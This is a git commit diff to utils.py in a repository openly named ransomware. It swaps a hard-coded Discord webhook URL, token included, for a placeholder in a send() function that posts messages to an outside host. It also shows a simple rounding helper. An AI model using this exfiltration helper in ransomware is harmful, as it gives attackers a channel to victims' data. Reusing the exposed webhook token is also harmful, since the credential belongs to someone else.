9013329ed80478942b2f6fd861145f49a9ec7629
OHR <88239635+b8ff@users.noreply.github.com>
2022-08-07 17:55:59 +0200

    RansomWare utils
    Some useful functions

--- RansomWare/utils.py
+++ RansomWare/utils.py
@@ -1,7 +1,7 @@
 import requests
 
 def send(message):
-    requests.post(url="https://discord.com/api/webhooks/1000508473156567120/wS9UX9_ptmwFdrksuQLCsiT542Po1EqoswKzvIXSyPVyZH-ETmiqqfdBxvyM_RGptESf", data={"content":message})
+    requests.post(url="WEBHOOK", data={"content":message})
 
 def better_round(number, decimals):
     multiplier = 10 ** decimals
